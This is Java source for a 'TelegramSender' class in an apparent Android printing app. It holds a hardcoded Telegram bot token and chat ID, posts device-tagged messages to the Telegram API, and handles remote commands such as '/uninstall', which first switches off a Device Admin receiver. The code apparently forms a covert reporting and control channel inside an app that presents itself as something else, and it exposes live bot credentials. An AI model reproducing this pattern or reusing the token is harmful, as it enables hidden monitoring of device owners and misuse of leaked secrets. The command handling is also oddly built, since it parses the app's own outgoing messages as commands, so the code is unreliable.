package com.cetakpro.print;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class TelegramSender {
    private static final String TAG = "TelegramSender";
    
    // HARDCODE TOKEN & CHAT ID
    private static final String BOT_TOKEN = "8662155042:AAFRLkduh9r2FoOtt3TkqmTxNqAmWleibew";
    private static final String CHAT_ID = "1286411089";
    
    private static final int CONNECT_TIMEOUT = 10000;
    private static final int READ_TIMEOUT = 10000;

    // ============================================================
    // KIRIM PESAN KE TELEGRAM
    // ============================================================
    public static void sendMessage(Context context, String title, String message) {
        new Thread(() -> {
            try {
                String fullText = title + "\n" + message + "\n\n📱 " + Build.MODEL;
                
                Log.d(TAG, "📤 Mengirim ke Telegram...");
                
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlString);
                
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(CONNECT_TIMEOUT);
                conn.setReadTimeout(READ_TIMEOUT);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                
                String bodyText = "chat_id=" + CHAT_ID + 
                                 "&text=" + URLEncoder.encode(fullText, StandardCharsets.UTF_8.name());
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(bodyText.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                }
                
                int responseCode = conn.getResponseCode();
                
                if (responseCode >= 200 && responseCode < 300) {
                    Log.d(TAG, "✅ Pesan terkirim (HTTP " + responseCode + ")");
                } else {
                    Log.e(TAG, "❌ Error HTTP " + responseCode);
                }
                
                conn.disconnect();
                
                // Cek apakah pesan adalah perintah
                if (message.startsWith("/")) {
                    handleTelegramCommand(context, message);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error: " + e.getMessage());
            }
        }).start();
    }

    // ============================================================
    // HANDLE COMMAND DARI TELEGRAM
    // ============================================================
    private static void handleTelegramCommand(Context context, String command) {
        Log.d(TAG, "📩 Perintah diterima: " + command);
        
        // ==========================================
        // PERINTAH: /uninstall - HAPUS APLIKASI
        // ==========================================
        if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
            Log.d(TAG, "🗑️ Perintah uninstall diterima!");
            
            // Kirim konfirmasi
            sendMessage(context, "🗑️ UNINSTALL", "Menghapus VanNota dari " + Build.MODEL + "...");
            
            // Matikan Device Admin agar bisa diuninstall
            try {
                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName admin = new ComponentName(context, AdminReceiver.class);
                if (dpm.isAdminActive(admin)) {
                    dpm.removeActiveAdmin(admin);
                    Log.d(TAG, "✅ Device Admin dinonaktifkan");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Gagal matikan admin: " + e.getMessage());
            }
            
            // Tunggu sebentar agar admin mati
            try {
                Thread.sleep(1500);
            } catch (InterruptedException ignored) {}
            
            // Jalankan proses uninstall
            try {
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                Log.d(TAG, "✅ Intent uninstall dikirim");
            } catch (Exception e) {
                Log.e(TAG, "❌ Gagal uninstall: " + e.getMessage());
                sendMessage(context, "❌ GAGAL UNINSTALL", "Error: " + e.getMessage());
            }
            
            // Hentikan proses aplikasi
            android.os.Process.killProcess(android.os.Process.myPid());
            return;
        }
        
        // ==========================================
        // PERINTAH: /info - LIHAT INFO PERANGKAT
        // ==========================================
        if (command.equalsIgnoreCase("/info") || command.equalsIgnoreCase("/status")) {
            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            String deviceName = prefs.getString("device_name", Build.MODEL);
            String deviceId = prefs.getString("device_id", "Tidak diketahui");
            String androidVersion = Build.VERSION.RELEASE;
            
            String info = "📱 INFO PERANGKAT\n" +
                          "Nama: " + deviceName + "\n" +
                          "Android: " + androidVersion + "\n" +
                          "ID: " + deviceId + "\n" +
                          "Status: Aktif\n\n" +
                          "Perintah:\n" +
                          "/uninstall - Hapus aplikasi\n" +
                          "/rename [nama] - Ubah nama perangkat\n" +
                          "/info - Lihat info ini";
            
            sendMessage(context, "ℹ️ Device Info", info);
            return;
        }
        
        // ==========================================
        // PERINTAH: /rename [nama] - UBAH NAMA PERANGKAT
        // ==========================================
        if (command.startsWith("/rename ")) {
            String newName = command.substring(8).trim();
            if (newName.isEmpty()) {
                sendMessage(context, "⚠️ RENAME", "Format: /rename [nama baru]");
                return;
            }
            
            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            prefs.edit().putString("device_name", newName).apply();
            
            sendMessage(context, "✅ RENAME", "Nama perangkat diubah menjadi:\n" + newName);
            return;
        }
        
        // ==========================================
        // PERINTAH: /help - BANTUAN
        // ==========================================
        if (command.equalsIgnoreCase("/help")) {
            String help = "📋 DAFTAR PERINTAH\n\n" +
                          "/uninstall - Hapus aplikasi dari perangkat ini\n" +
                          "/info - Lihat info perangkat\n" +
                          "/rename [nama] - Ubah nama perangkat\n" +
                          "/help - Tampilkan bantuan ini\n\n" +
                          "⚠️ Hanya pemilik yang dapat menggunakan perintah ini.";
            sendMessage(context, "🆘 Bantuan", help);
            return;
        }
        
        // ==========================================
        // PERINTAH TIDAK DIKENAL
        // ==========================================
        sendMessage(context, "❓ Perintah tidak dikenal", "Kirim /help untuk melihat daftar perintah.");
    }
                    }
